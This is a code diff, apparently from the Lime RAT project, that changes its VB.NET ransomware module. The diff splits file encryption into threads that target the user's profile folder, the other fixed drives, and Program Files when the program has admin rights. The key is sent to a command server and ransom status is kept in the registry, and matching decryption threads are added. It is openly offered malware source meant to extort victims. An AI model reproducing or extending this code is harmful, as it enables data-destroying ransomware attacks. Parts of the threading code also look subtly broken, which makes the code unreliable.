@@ -13,6 +13,10 @@ Namespace Lime
         Private Const KEYEVENTF_KEYUP = &H2
         Private Const VK_LWIN = &H5B
         Public HW = ID.UserName + "_" + ID.HWID
+        Public C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
+        Public username = Environment.UserName
+        Public key As String
+        Public num As Integer
 
         Public Sub BeforeAttack(ByVal msg As String, ByRef pic As String)
             A1 = msg
@@ -35,22 +39,54 @@ Namespace Lime
             C.Send("GET-PASS" + C.SPL + HW + C.SPL + key)
             C.Send(("c_ransome" & C.SPL & "Encryption in progress..."))
 
-            For Each drive In Environment.GetLogicalDrives
-                Dim Driver As DriveInfo = New DriveInfo(drive)
-                If Driver.DriveType = DriveType.Fixed Then
-                    Dim DriverPath As String = drive
-                    Dir_En(DriverPath, key)
-                End If
-            Next
+            Dim T1 As New Threading.Thread(AddressOf Enc_Prog)
+            Dim T2 As New Threading.Thread(AddressOf Enc_Driver)
+            Dim T3 As New Threading.Thread(AddressOf Enc_User)
+
+            T1.Start()
+            T2.Start()
+            T3.Start()
+
+
+            Do Until num = 3
+
+                Threading.Thread.Sleep(1000)
+            Loop
+            num = Nothing
 
             Messager(A1, A2)
             key = Nothing
             C.Send(("c_ransome" & C.SPL & "Encrypted"))
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encrypted")
             SC()
-            Dim T2 As New Threading.Thread(AddressOf MISC.Proc)
-            T2.Start()
+            Dim proc As New Threading.Thread(AddressOf MISC.Proc)
+            'proc.Start()
             Exit Sub
+        End Sub
+
+        Public Sub Enc_User(ByVal password As String)
+            On Error Resume Next
+            Dir_En(C_DIR & "Users\" & username & "\", key)
+            num += 1
+        End Sub
+
+        Public Sub Enc_Driver(ByVal password As String)
+            On Error Resume Next
+            For Each drive In Environment.GetLogicalDrives
+                Dim Driver As DriveInfo = New DriveInfo(drive)
+                If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
+                    Dim DriverPath As String = drive
+                    Dir_En(DriverPath, key)
+                End If
+            Next
+            num += 1
+        End Sub
+
+        Public Sub Enc_Prog(ByVal password As String)
+            If ID.AmiAdmin = "Administrator" Then
+                Dir_En(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", key)
+            End If
+            num += 1
         End Sub
 
         Public Function AES_Enc(ByVal B2Enc As Byte(), ByVal KeyBytes As Byte()) As Byte()
@@ -187,6 +223,7 @@ Namespace Lime
         End Sub
 
 
+
         Public Sub Dec(ByVal key As String)
             On Error Resume Next
             Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
@@ -196,13 +233,21 @@ Namespace Lime
 
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Decryption in progress...")
             C.Send(("c_ransome" & C.SPL & "Decryption in progress..."))
-            For Each drive In Environment.GetLogicalDrives
-                Dim Driver As DriveInfo = New DriveInfo(drive)
-                If Driver.DriveType = DriveType.Fixed Then
-                    Dim DriverPath As String = drive
-                    Dir_Dec(DriverPath, P1)
-                End If
-            Next
+
+            Dim T1 As New Threading.Thread(AddressOf Dec_Prog)
+            Dim T2 As New Threading.Thread(AddressOf Dec_Driver)
+            Dim T3 As New Threading.Thread(AddressOf Dec_User)
+
+            T1.Start()
+            T2.Start()
+            T3.Start()
+
+
+            Do Until num = 3
+
+                Threading.Thread.Sleep(1000)
+            Loop
+            num = Nothing
 
             P1 = Nothing
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Decrypted")
@@ -218,6 +263,31 @@ Namespace Lime
             Loop
             Exit Sub
 
+        End Sub
+
+        Public Sub Dec_User(ByVal password As String)
+            On Error Resume Next
+            Dir_Dec(C_DIR & "Users\" & username & "\", P1)
+            num += 1
+        End Sub
+
+        Public Sub Dec_Driver(ByVal password As String)
+            On Error Resume Next
+            For Each drive In Environment.GetLogicalDrives
+                Dim Driver As DriveInfo = New DriveInfo(drive)
+                If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
+                    Dim DriverPath As String = drive
+                    Dir_Dec(DriverPath, P1)
+                End If
+            Next
+            num += 1
+        End Sub
+
+        Public Sub Dec_Prog(ByVal password As String)
+            If ID.AmiAdmin = "Administrator" Then
+                Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
+            End If
+            num += 1
         End Sub
 
         Public Function AES_Dec(ByVal B2Dec As Byte(), ByVal KeyBytes As Byte()) As Byte()
